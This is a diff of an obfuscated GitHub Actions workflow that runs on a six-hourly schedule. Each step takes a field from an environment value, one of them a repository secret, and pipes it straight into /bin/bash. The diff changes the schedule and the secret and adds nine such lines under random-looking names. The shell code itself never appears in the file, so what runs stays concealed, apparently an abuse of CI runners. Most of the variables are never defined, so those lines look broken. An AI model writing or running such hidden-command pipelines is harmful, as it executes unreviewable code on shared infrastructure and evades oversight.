@@ -1,25 +1,25 @@
 name: xiongyonghong6473
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 0/6 * * *'
+    - cron: '30 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiongyonghong6473
         env:
-          tkud307: ${{ secrets.tkud307 }}
+          sbd10: ${{ secrets.sbd10 }}
         run: |
-          echo $tkud307 | jq -r .jn1 | /bin/bash
-          echo $woe6739 | jq -r .c1 | /bin/bash
-          echo $q816 | jq -r .dqip9661 | /bin/bash
-          echo $w146 | jq -r .ge01683 | /bin/bash
-          echo $xhtw98 | jq -r .rmwu180 | /bin/bash
-          echo $fp3 | jq -r .qtixk870 | /bin/bash
-          echo $mx3 | jq -r .jsi52 | /bin/bash
+          echo $sbd10 | jq -r .qivhg2 | /bin/bash
+          echo $k4763 | jq -r .daon27 | /bin/bash
+          echo $vkpd78160 | jq -r .dlao20 | /bin/bash
+          echo $b03 | jq -r .m96 | /bin/bash
+          echo $gng58 | jq -r .rc4 | /bin/bash
+          echo $awcou6 | jq -r .wq70351 | /bin/bash
+          echo $fuq63844 | jq -r .lrkd0854 | /bin/bash
+          echo $hpybu83773 | jq -r .kdnms157 | /bin/bash
+          echo $etad368 | jq -r .e431 | /bin/bash
 
